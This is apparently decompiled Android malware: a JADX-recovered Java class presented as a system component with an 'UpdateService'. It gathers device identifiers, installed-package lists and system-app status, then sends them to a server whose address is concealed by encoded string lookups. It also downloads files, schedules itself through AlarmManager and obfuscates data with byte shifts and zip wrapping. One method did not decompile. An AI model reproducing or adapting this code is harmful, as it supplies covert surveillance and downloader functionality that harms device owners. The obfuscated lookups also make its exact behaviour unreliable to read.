package com.android.a;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Handler;
import com.android.system.UpdateService;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

/* renamed from: com.android.a.b, reason: case insensitive filesystem */
/* loaded from: classes.dex */
public class C0001b {
    String b;
    String c;
    q k;
    int a = 2;
    String d = null;
    String e = null;
    File f = null;
    long g = 0;
    long h = 0;
    boolean i = false;
    HttpURLConnection j = null;

    public C0001b(String str, String str2, q qVar) {
        this.b = null;
        this.c = null;
        this.k = null;
        this.b = str;
        this.c = str2;
        this.k = qVar;
    }

    public static byte a(int i) {
        return (byte) (i + 20);
    }

    public static int a(Context context) throws PackageManager.NameNotFoundException {
        try {
            PackageInfo packageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
            if (packageInfo != null) {
                if ((packageInfo.applicationInfo.flags & 1) == 1) {
                    return 1;
                }
            }
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        return 0;
    }

    static i a(Context context, String str, String str2, boolean z, int i, String[] strArr, i iVar) {
        iVar.a(o.d, t.c());
        iVar.a(o.s, t.b(context));
        iVar.a(o.e, t.d());
        iVar.a(o.b, Long.toString(t.b()));
        iVar.a(o.c, Long.toString(t.d(context)));
        iVar.a(o.f, str);
        iVar.a(o.g, str2);
        iVar.a(o.h, Boolean.toString(z));
        iVar.a(o.i, Integer.toString(i));
        iVar.a(o.t, e.g(context));
        if (strArr != null) {
            String str3 = "";
            for (String str4 : strArr) {
                str3 = String.valueOf(String.valueOf(str3) + str4) + "*";
            }
            iVar.a(o.j, str3);
        }
        HashMap mapF = t.f();
        if (!mapF.isEmpty()) {
            iVar.a(o.u, (String) mapF.get(o.l));
            iVar.a(o.v, (String) mapF.get(o.m));
        }
        return iVar;
    }

    public static String a(String str) throws IOException {
        String str2;
        Exception e;
        String str3 = com.a.a.a.d.b;
        File file = new File(str);
        if (!file.exists()) {
            return str3;
        }
        try {
            FileInputStream fileInputStream = new FileInputStream(file);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(1024);
            byte[] bArr = new byte[1024];
            while (true) {
                int i = fileInputStream.read(bArr);
                if (i == -1) {
                    str2 = new String(com.a.a.c.b.a().b(byteArrayOutputStream.toByteArray()));
                    try {
                        fileInputStream.close();
                        byteArrayOutputStream.flush();
                        byteArrayOutputStream.close();
                        return str2;
                    } catch (Exception e2) {
                        e = e2;
                        e.printStackTrace();
                        return str2;
                    }
                }
                byteArrayOutputStream.write(bArr, 0, i);
            }
        } catch (Exception e3) {
            str2 = str3;
            e = e3;
        }
    }

    public static HashMap a(Context context, String str) {
        String str2;
        if (!t.a(context)) {
            return null;
        }
        String strA = t.a(C0000a.cv);
        String strA2 = t.a(C0000a.J);
        String str3 = String.valueOf(String.valueOf(String.valueOf(String.valueOf(String.valueOf("") + n.a + strA + c.a(context) + strA2) + n.b + strA + e.b(context) + strA2) + n.c + strA + t.d() + strA2) + n.d + strA + t.c() + strA2) + n.f + strA + str + strA2;
        ArrayList arrayListF = t.f(context);
        if (arrayListF.isEmpty()) {
            str2 = str3;
        } else {
            String str4 = "";
            int i = 0;
            while (i < arrayListF.size()) {
                String str5 = String.valueOf(str4) + ((String) arrayListF.get(i)) + t.a(C0000a.E);
                i++;
                str4 = str5;
            }
            str2 = String.valueOf(str3) + n.e + strA + str4 + strA2;
        }
        HashMap mapA = t.a(new r(t.c(k.b), String.valueOf(String.valueOf(String.valueOf(String.valueOf(String.valueOf(str2) + n.g + strA + strA2) + n.h + strA + (t.h(context) ? t.a(C0000a.at) : t.a(C0000a.au)) + strA2) + n.i + strA + t.b(context) + strA2) + n.j + strA + e.e(context) + strA2) + n.k + strA + t.g() + strA2).a());
        if (a(mapA)) {
            return mapA;
        }
        return null;
    }

    public static void a(Context context, Handler handler) {
        File[] fileArrE = e();
        if (fileArrE == null) {
            handler.sendEmptyMessageDelayed(6, 6000L);
            return;
        }
        for (File file : fileArrE) {
            if (System.currentTimeMillis() - file.lastModified() > 432000000) {
                file.delete();
            }
        }
        handler.sendEmptyMessageDelayed(6, 6000L);
    }

    static void a(Context context, i iVar) {
        if (!t.a(context)) {
            iVar.b();
            return;
        }
        String strA = iVar.a();
        if (e.f()) {
            strA = strA.replace(p.b, String.valueOf(m.f) + t.a(C0000a.ct) + p.b);
        }
        if (!a(t.a(new r(t.b(k.a), strA).a()))) {
            iVar.b();
        } else if (e.f()) {
            e.g();
        }
    }

    public static void a(Context context, String str, long j) {
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(com.a.a.a.b.X);
        Intent intent = new Intent(context, (Class<?>) UpdateService.class);
        intent.setAction(str);
        alarmManager.set(0, j, PendingIntent.getService(context, 0, intent, 268435456));
    }

    public static void a(Context context, String str, String str2, Map map) {
        i iVar = new i(context);
        iVar.a(o.a);
        i iVarA = a(context, t.e(), t.e(), false, 0, null, iVar);
        if (str2 == m.e) {
            iVarA.a(o.r, (String) e.c.get("YUNOS_BUILD_VERSION"));
        }
        if (map != null) {
            for (Map.Entry entry : map.entrySet()) {
                iVarA.a((String) entry.getKey(), (String) entry.getValue());
            }
        }
        iVarA.a(o.k, str2);
        a(context, iVarA);
    }

    public static void a(String str, String str2, Handler handler) throws IOException {
        com.a.a.c.b bVarA = com.a.a.c.b.a();
        File file = new File(com.a.a.a.b.a);
        if (!file.exists()) {
            file.mkdirs();
        }
        try {
            File file2 = new File(String.valueOf(file.getAbsolutePath()) + File.separator + str2 + com.a.a.a.b.p);
            if (!file2.exists()) {
                file2.createNewFile();
            }
            FileOutputStream fileOutputStream = new FileOutputStream(file2);
            fileOutputStream.write(bVarA.a(c(str).getBytes()));
            fileOutputStream.flush();
            fileOutputStream.close();
            if (handler != null) {
                handler.sendEmptyMessage(4);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static boolean a(HashMap map) {
        if (map == null) {
            return false;
        }
        String str = (String) map.get(l.a);
        return str != null && str.equals(t.a(C0000a.cs));
    }

    public static byte[] a(byte[] bArr) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(bArr.length);
        BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(byteArrayOutputStream);
        ZipOutputStream zipOutputStream = new ZipOutputStream(bufferedOutputStream);
        ZipEntry zipEntry = new ZipEntry(String.valueOf(bArr.length));
        zipEntry.setMethod(8);
        zipEntry.setSize(bArr.length);
        zipOutputStream.putNextEntry(zipEntry);
        zipOutputStream.write(bArr, 0, bArr.length);
        zipOutputStream.flush();
        bufferedOutputStream.flush();
        byteArrayOutputStream.flush();
        zipOutputStream.close();
        byte[] byteArray = byteArrayOutputStream.toByteArray();
        byteArrayOutputStream.close();
        bufferedOutputStream.close();
        return byteArray;
    }

    public static String b(String str) throws NoSuchAlgorithmException {
        try {
            MessageDigest messageDigest = MessageDigest.getInstance(com.a.a.a.b.D);
            char[] charArray = str.toCharArray();
            byte[] bArr = new byte[charArray.length];
            for (int i = 0; i < charArray.length; i++) {
                bArr[i] = (byte) charArray[i];
            }
            byte[] bArrDigest = messageDigest.digest(bArr);
            StringBuffer stringBuffer = new StringBuffer();
            for (byte b : bArrDigest) {
                int i2 = b & 255;
                if (i2 < 16) {
                    stringBuffer.append(String.valueOf(0));
                }
                stringBuffer.append(Integer.toHexString(i2));
            }
            return stringBuffer.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    public static byte[] b(byte[] bArr) throws IOException, NumberFormatException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ZipInputStream zipInputStream = new ZipInputStream(new BufferedInputStream(new ByteArrayInputStream(bArr, 0, bArr.length)));
        ZipEntry nextEntry = zipInputStream.getNextEntry();
        if (nextEntry != null) {
            long compressedSize = nextEntry.getCompressedSize();
            if (compressedSize < 0) {
                compressedSize = Long.parseLong(nextEntry.getName());
            }
            int i = (int) compressedSize;
            byte[] bArr2 = new byte[i];
            int i2 = 0;
            do {
                int i3 = zipInputStream.read(bArr2, 0, i - i2);
                byteArrayOutputStream.write(bArr2, 0, i3);
                i2 += i3;
            } while (i2 < i);
        }
        byte[] byteArray = byteArrayOutputStream.toByteArray();
        byteArrayOutputStream.flush();
        byteArrayOutputStream.close();
        zipInputStream.close();
        return byteArray;
    }

    public static String c(String str) {
        return str.replace("，", ",").replace("。", ".").replace("：", ":").replace("（", "(").replace("）", ")").replace("“", "\"").replace("”", "\"");
    }

    public static byte[] c(byte[] bArr) {
        int length = bArr.length;
        byte[] bArr2 = new byte[length];
        for (int i = 0; i < length; i++) {
            bArr2[i] = (byte) (bArr[i] - 1);
        }
        return bArr2;
    }

    public static String d(byte[] bArr) {
        return new String(c(bArr));
    }

    public static File[] e() {
        File file = new File(com.a.a.a.b.a);
        if (file.isDirectory()) {
            return file.listFiles();
        }
        return null;
    }

    public boolean a() {
        return this.i;
    }

    boolean b() throws IOException {
        try {
            this.j = (HttpURLConnection) new URL(this.b).openConnection();
            this.j.setDoInput(true);
            this.j.setUseCaches(false);
            this.j.setConnectTimeout(60000);
            this.j.setReadTimeout(60000);
            this.j.setRequestMethod(t.a(C0000a.V));
            this.e = String.valueOf(this.c) + t.a(C0000a.X);
            this.f = new File(this.e);
            this.h = (int) this.f.length();
            if (!this.f.exists()) {
                this.f.createNewFile();
            }
            return true;
        } catch (IOException e) {
            e.printStackTrace();
            if (this.j != null) {
                this.j.disconnect();
            }
            return false;
        }
    }

    /* JADX WARN: Can't wrap try/catch for region: R(10:(6:13|(2:14|(7:16|45|17|56|18|58|57)(0))|21|(1:23)|24|(4:50|27|54|53)(5:48|28|(2:29|(1:60)(1:39))|31|51))(0)|43|21|(0)|24|(1:50)(1:49)|27|54|53|7) */
    /* JADX WARN: Code restructure failed: missing block: B:33:0x00bc, code lost:
    
        r3 = move-exception;
     */
    /* JADX WARN: Code restructure failed: missing block: B:35:0x00bf, code lost:
    
        if (r11.j != null) goto L36;
     */
    /* JADX WARN: Code restructure failed: missing block: B:36:0x00c1, code lost:
    
        r11.j.disconnect();
     */
    /* JADX WARN: Code restructure failed: missing block: B:37:0x00ca, code lost:
    
        if (b() == false) goto L52;
     */
    /* JADX WARN: Code restructure failed: missing block: B:38:0x00cc, code lost:
    
        r0 = r11.k;
     */
    /* JADX WARN: Code restructure failed: missing block: B:41:0x00e2, code lost:
    
        r3.getStackTrace();
        r1 = r1 + 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:62:?, code lost:
    
        return;
     */
    /* JADX WARN: Removed duplicated region for block: B:23:0x0055 A[Catch: Exception -> 0x00bc, TryCatch #0 {Exception -> 0x00bc, blocks: (B:21:0x003e, B:23:0x0055, B:24:0x0076, B:28:0x00a1, B:29:0x00a5, B:31:0x00ac, B:39:0x00d0, B:27:0x009d), top: B:43:0x003e }] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public void c() throws java.lang.InterruptedException, java.io.IOException {
        /*
            Method dump skipped, instructions count: 237
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.android.a.C0001b.c():void");
    }

    public boolean d() throws InterruptedException, IOException {
        String strSubstring;
        String str = this.c;
        int iLastIndexOf = str.lastIndexOf(t.a(C0000a.dy));
        int iLastIndexOf2 = str.lastIndexOf(t.a(C0000a.dx));
        if (iLastIndexOf < 0) {
            strSubstring = null;
        } else {
            if (iLastIndexOf2 < 0) {
                iLastIndexOf2 = str.length();
            }
            strSubstring = str.substring(iLastIndexOf + 1, iLastIndexOf2);
        }
        this.d = strSubstring;
        if (this.d == null) {
            return false;
        }
        c();
        return true;
    }
}
